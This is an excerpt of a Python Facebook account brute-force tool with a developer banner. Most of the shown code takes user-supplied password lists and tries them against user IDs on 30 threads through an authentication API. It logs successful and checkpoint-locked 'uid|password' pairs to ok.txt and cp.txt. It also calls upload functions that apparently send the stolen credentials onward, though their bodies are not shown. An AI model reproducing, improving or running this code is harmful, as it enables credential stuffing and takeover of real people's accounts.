...
| $$ | $$ | $$| $$  /$$__/   /$$__  $$| $$      | $$  | $$
|  $$$$$/$$$$/| $$ /$$$$$$$$|  $$$$$$$| $$      |  $$$$$$$
 \_____/\___/ |__/|________/ \_______/|__/       \_____
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            WIZARD OUSSAMA
     \033[1;91m➣ \033[1;92mFACEBOOK   :            oussama smix
     \033[1;93m➣ \033[1;92mWHATSAPP   :            0701*****4
     \033[1;96m➣ \033[1;92mGITHUB     :            wiza13
...
#				exit()
	...
	def old4_6(self):
		...
		try:
			...
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR WIZARD "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)) 
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX:WIZ ): "%(Y,G))
		nam = nam.replace(" ", "")
		...
		try:
			...
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR WIZ "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)) 
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[>_] [WIZ] : \033[0;97m %s/%s -> \033[0;92m [WIZ -OK:%s ]- \033[0;93m[WIZ-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[WIZ-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [WIZ-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[WIZ-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [WIZ-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
